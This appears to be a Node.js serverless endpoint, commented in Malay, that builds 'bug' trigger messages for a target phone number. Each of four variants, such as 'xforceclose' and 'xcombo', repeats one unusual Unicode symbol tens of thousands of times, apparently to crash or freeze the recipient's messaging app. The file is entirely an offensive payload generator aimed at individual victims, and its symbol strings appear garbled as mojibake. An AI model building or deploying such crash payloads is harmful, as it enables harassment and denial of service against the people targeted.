module.exports = async (req, res) => {
  const { type, target } = req.query;

  // Semak jika parameter tidak lengkap
  if (!type || !target) {
    return res.status(400).json({ 
      success: false,
      error: 'Parameter "type" dan "target" diperlukan. Contoh: ?type=xcombo&target=60123456789' 
    });
  }

  // Simbol bug
  const bugSymbol = "ğ‘²­";
  let triggerText = '';

  // Pilih jenis bug
  switch (type.toLowerCase()) {
    case 'xforceclose':
      triggerText = bugSymbol.repeat(60000);
      break;

    case 'xinvisible':
      triggerText = "InvisibleBug" + bugSymbol.repeat(50000);
      break;

    case 'xviewonce':
      triggerText = "ğŸ”VIEWONCEğŸ”" + bugSymbol.repeat(30000);
      break;

    case 'xcombo':
      triggerText = "COMBOğŸ”¥" + bugSymbol.repeat(70000);
      break;

    default:
      return res.status(400).json({ 
        success: false,
        error: 'Jenis bug tidak valid. Gunakan: xforceclose, xinvisible, xviewonce, xcombo' 
      });
  }

  // Log ke Vercel console
  console.log(`[Dilx Trigger] Type: ${type} | Target: ${target} | Length: ${triggerText.length}`);

  // Balas ke pengguna
  return res.status(200).json({
    success: true,
    target,
    type,
    triggerLength: triggerText.length,
    preview: triggerText.slice(0, 100) + '...',
    message: 'Trigger bug berjaya dijana.'
  });
};
